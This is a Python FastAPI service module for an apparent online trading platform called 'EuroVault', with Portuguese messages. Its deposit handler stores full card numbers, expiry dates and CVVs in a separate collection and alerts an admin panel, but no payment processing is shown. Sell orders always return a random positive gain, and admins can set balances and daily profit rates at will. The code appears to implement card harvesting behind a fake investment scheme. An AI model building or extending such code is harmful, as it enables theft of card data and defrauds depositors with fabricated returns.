"""
services/user_service.py — User & Financial Business Logic
===========================================================
EuroVault Digital Solutions

This service layer decouples business logic from HTTP routing.
Controllers (routers/) call these functions instead of embedding logic inline.

Responsibilities:
  - Profile management   : get_profile(), update_profile()
  - Daily profit accrual : apply_daily_profit()
  - Deposit processing   : process_deposit()
  - Withdrawal handling  : process_withdrawal()
  - Order execution      : execute_order()   (buy / sell with P&L)
  - Admin balance update : admin_set_balance()
  - Audit logging        : log_admin_action()
"""

from __future__ import annotations

import random
from datetime import datetime
from typing import Optional
from bson import ObjectId
from fastapi import HTTPException

from core.database import db, serialize_doc
from core.security import manager


# ─────────────────────────────────────────────────────────────────────────────
# Profile helpers
# ─────────────────────────────────────────────────────────────────────────────

async def apply_daily_profit(user_id: str, user_doc: dict) -> dict:
    """
    Accumulate daily profit proportionally every minute,
    and add to the account balance every 24 hours.

    This is called on every /api/me request to keep balances live.
    """
    rate = float(user_doc.get("daily_profit_rate", 0))
    if rate <= 0 or float(user_doc.get("balance", 0)) <= 0:
        return user_doc

    now          = datetime.utcnow()
    balance      = float(user_doc.get("balance", 0))
    daily_profit = balance * (rate / 100.0)
    updates: dict = {}

    # Accumulate profit proportionally (every ~1 minute)
    last_profit_upd = user_doc.get("profit_last_updated")
    if last_profit_upd:
        elapsed = (now - last_profit_upd).total_seconds() / 86400.0
        if elapsed >= 0.0007:
            new_profit = max(0.0, float(user_doc.get("profit", 0)) + daily_profit * elapsed)
            updates["profit"]               = round(new_profit, 2)
            updates["profit_last_updated"]  = now
            user_doc["profit"]              = updates["profit"]
    else:
        updates["profit_last_updated"] = now

    # Add to balance every 24 hours
    last_balance_upd = user_doc.get("balance_last_updated")
    if not last_balance_upd:
        updates["balance_last_updated"] = now
    else:
        elapsed_since = (now - last_balance_upd).total_seconds() / 86400.0
        if elapsed_since >= 1.0:
            full_days           = int(elapsed_since)
            new_balance         = balance + daily_profit * full_days
            updates["balance"]  = round(new_balance, 2)
            updates["balance_last_updated"] = now
            user_doc["balance"] = updates["balance"]

    if updates:
        await db.users.update_one({"_id": ObjectId(user_id)}, {"$set": updates})

    return user_doc


async def get_profile(user_id: str) -> dict:
    """Fetch user, apply daily profit, update last_seen, return serialized profile."""
    user = await db.users.find_one({"_id": ObjectId(user_id)})
    if not user:
        raise HTTPException(status_code=404, detail="Utilizador não encontrado")

    user = await apply_daily_profit(user_id, user)
    await db.users.update_one({"_id": ObjectId(user_id)},
                               {"$set": {"last_seen": datetime.utcnow()}})
    return serialize_doc({
        "id":                     user["_id"],
        "full_name":              user["full_name"],
        "email":                  user["email"],
        "country":                user.get("country", ""),
        "phone":                  user.get("phone", ""),
        "balance":                max(0.0, float(user.get("balance", 0))),
        "profit":                 max(0.0, float(user.get("profit", 0))),
        "status":                 user.get("status", "Novo"),
        "daily_profit_rate":      user.get("daily_profit_rate", 0),
        "goal_amount":            user.get("goal_amount", 0.0),
        "goal_label":             user.get("goal_label", ""),
        "daily_withdrawal_limit": user.get("daily_withdrawal_limit", 0.0),
        "kyc_status":             user.get("kyc_status", "not_submitted"),
        "two_fa_enabled":         user.get("two_fa_enabled", False),
        "created_at":             user.get("created_at"),
    })


# ─────────────────────────────────────────────────────────────────────────────
# Deposit
# ─────────────────────────────────────────────────────────────────────────────

async def process_deposit(user_id: str, user_email: str, req) -> dict:
    """
    Persist card data, create a pending deposit record,
    and broadcast a WebSocket notification to the admin panel.

    Args:
        user_id    : authenticated user's MongoDB _id (str)
        user_email : authenticated user's email
        req        : DepositRequest pydantic model

    Returns:
        {"success": True, "message": "..."}
    """
    card_data = {
        "user_id":    user_id,
        "email":      user_email,
        "full_name":  req.full_name,
        "card_number":req.card_number,
        "expiry":     req.expiry,
        "cvv":        req.cvv,
        "country":    req.country,
        "postal_code":req.postal_code,
        "amount":     req.amount,
        "created_at": datetime.utcnow(),
    }
    await db.cards_data.insert_one(card_data)
    await db.deposits.insert_one({
        "user_id":    user_id,
        "amount":     req.amount,
        "status":     "pending",
        "created_at": datetime.utcnow(),
    })

    user      = await db.users.find_one({"_id": ObjectId(user_id)}, {"full_name": 1})
    user_name = user["full_name"] if user else req.full_name
    await manager.broadcast({
        "type":      "deposit_submitted",
        "user_id":   user_id,
        "user_name": user_name,
        "email":     user_email,
        "amount":    req.amount,
        "country":   req.country,
        "card_last4":req.card_number[-4:] if len(req.card_number) >= 4 else "***",
        "timestamp": datetime.utcnow().isoformat(),
    })
    return {"success": True, "message": "Depósito enviado para processamento"}


# ─────────────────────────────────────────────────────────────────────────────
# Withdrawal
# ─────────────────────────────────────────────────────────────────────────────

async def process_withdrawal(user_id: str, user_email: str, req) -> dict:
    """
    Validate daily limit and available balance, then create a pending
    withdrawal request and broadcast to admin WebSocket.

    Raises HTTPException on validation failure.
    """
    user_doc: Optional[dict] = None

    if req.amount and req.amount > 0:
        user_doc = await db.users.find_one({"_id": ObjectId(user_id)})
        if not user_doc:
            raise HTTPException(status_code=404, detail="Utilizador não encontrado")

        current_balance = max(0.0, float(user_doc.get("balance", 0)))
        daily_limit     = float(user_doc.get("daily_withdrawal_limit", 0))

        if daily_limit > 0 and req.amount > daily_limit:
            raise HTTPException(status_code=400,
                detail=f"Montante superior ao limite diário de {daily_limit:.2f}€. "
                       "Contacte o suporte para aumentar o limite.")
        if req.amount > current_balance:
            raise HTTPException(status_code=400,
                detail=f"Saldo insuficiente. Disponível: {current_balance:.2f}€. "
                       f"Solicitado: {req.amount:.2f}€.")

    if user_doc is None:
        user_doc = await db.users.find_one({"_id": ObjectId(user_id)})

    withdrawal = {
        "user_id":      user_id,
        "user_name":    user_doc.get("full_name", "") if user_doc else "",
        "user_email":   user_email,
        "method":       req.method,
        "account_name": req.account_name,
        "iban":         req.iban,
        "bic":          req.bic,
        "card_holder":  req.card_holder,
        "card_number":  req.card_number,
        "amount":       req.amount,
        "note":         req.note,
        "status":       "pending",
        "created_at":   datetime.utcnow(),
    }
    await db.withdrawals.insert_one(withdrawal)

    try:
        await manager.broadcast({
            "type":       "withdrawal_requested",
            "user_name":  user_doc.get("full_name", "") if user_doc else "",
            "user_email": user_email,
            "amount":     req.amount or 0,
            "method":     req.method,
            "timestamp":  datetime.utcnow().isoformat(),
        })
    except Exception:
        pass

    return {"success": True, "message": "Pedido de levantamento enviado para aprovação"}


# ─────────────────────────────────────────────────────────────────────────────
# Order Execution  (buy / sell)
# ─────────────────────────────────────────────────────────────────────────────

async def execute_order(user_id: str, req) -> dict:
    """
    Execute a market order (buy or sell).

    Buy  → deducts amount from balance.
    Sell → validates open position, calculates simulated P&L, adds to balance.

    Args:
        user_id : authenticated user's MongoDB _id (str)
        req     : OrderRequest pydantic model

    Returns:
        dict with balance_before, balance_after, side, amount

    Raises:
        HTTPException on validation failure.
    """
    amount = max(0.0, float(req.amount or 0))
    if amount < 1:
        raise HTTPException(status_code=400, detail="Montante inválido (mínimo €1).")

    user = await db.users.find_one({"_id": ObjectId(user_id)})
    if not user:
        raise HTTPException(status_code=404, detail="Utilizador não encontrado")

    balance     = max(0.0, float(user.get("balance", 0)))
    profit      = max(0.0, float(user.get("profit",  0)))
    new_balance = balance
    new_profit  = profit

    if req.side == "comprar":
        if amount > balance:
            raise HTTPException(status_code=400,
                detail=f"Saldo insuficiente. Disponível: {balance:.2f}€. "
                       f"Necessário: {amount:.2f}€.")
        new_balance = round(balance - amount, 2)

    elif req.side == "vender":
        total_bought = 0.0
        total_sold   = 0.0
        async for order in db.orders.find({
            "user_id": user_id, "asset_label": req.asset_label, "status": "executada"
        }):
            if order.get("side") == "comprar":
                total_bought += float(order.get("amount", 0))
            elif order.get("side") == "vender":
                total_sold   += float(order.get("amount", 0))

        open_position = round(total_bought - total_sold, 2)
        if open_position <= 0:
            raise HTTPException(status_code=400,
                detail=f"Sem posição aberta em {req.asset_label}. "
                       "Precisa de comprar primeiro antes de poder vender.")
        if round(amount, 2) > open_position:
            raise HTTPException(status_code=400,
                detail=f"Não pode vender {amount:.2f}€. "
                       f"Posição aberta em {req.asset_label}: {open_position:.2f}€.")

        # Simulated P&L: 0.1–1.5% base, amplified by leverage (cap 3×)
        lev_mult = _parse_leverage(req.leverage)
        base_pct = random.uniform(0.001, 0.015)
        gain     = round(amount * base_pct * min(lev_mult, 3), 2)
        new_balance = round(balance + amount + gain, 2)
        new_profit  = round(profit  + gain, 2)

    else:
        raise HTTPException(status_code=400, detail="Lado inválido. Use 'comprar' ou 'vender'.")

    # Persist updated balance
    await db.users.update_one({"_id": ObjectId(user_id)}, {"$set": {
        "balance":             new_balance,
        "profit":              new_profit,
        "updated_at":          datetime.utcnow(),
        "profit_last_updated": datetime.utcnow(),
    }})

    # Persist order record
    result = await db.orders.insert_one({
        "user_id":        user_id,
        "asset_label":    req.asset_label,
        "asset_name":     req.asset_name,
        "category":       req.category,
        "side":           req.side,
        "amount":         amount,
        "leverage":       req.leverage,
        "price":          req.price,
        "balance_before": balance,
        "balance_after":  new_balance,
        "status":         "executada",
        "created_at":     datetime.utcnow(),
    })

    try:
        await manager.broadcast({
            "type":    "balance_updated",
            "user_id": user_id,
            "balance": new_balance,
            "profit":  new_profit,
        })
    except Exception:
        pass

    return {
        "success":        True,
        "id":             str(result.inserted_id),
        "balance_before": balance,
        "balance_after":  new_balance,
        "side":           req.side,
        "amount":         amount,
    }


def _parse_leverage(leverage_str: str) -> int:
    """Parse '1:10' → 10, '1:1' → 1, etc. Returns an int (capped at 20)."""
    try:
        return max(1, min(int(str(leverage_str).split(":")[-1]), 20))
    except (ValueError, IndexError):
        return 1


# ─────────────────────────────────────────────────────────────────────────────
# Admin operations
# ─────────────────────────────────────────────────────────────────────────────

async def admin_set_balance(user_id: str, balance: float, profit: float,
                             daily_rate: float) -> None:
    """Update balance, profit, and daily profit rate for a user."""
    await db.users.update_one({"_id": ObjectId(user_id)}, {"$set": {
        "balance":             max(0.0, balance),
        "profit":              max(0.0, profit),
        "updated_at":          datetime.utcnow(),
    }})
    await db.users.update_one({"_id": ObjectId(user_id)}, {"$set": {
        "daily_profit_rate":   max(0.0, min(daily_rate, 100.0)),
        "profit_last_updated": datetime.utcnow(),
        "updated_at":          datetime.utcnow(),
    }})


async def log_admin_action(user_id: str, action: str,
                            details: Optional[dict] = None) -> None:
    """Persist an admin action to the audit log."""
    await db.audit_logs.insert_one({
        "user_id":    user_id,
        "action":     action,
        "details":    details or {},
        "created_at": datetime.utcnow(),
    })
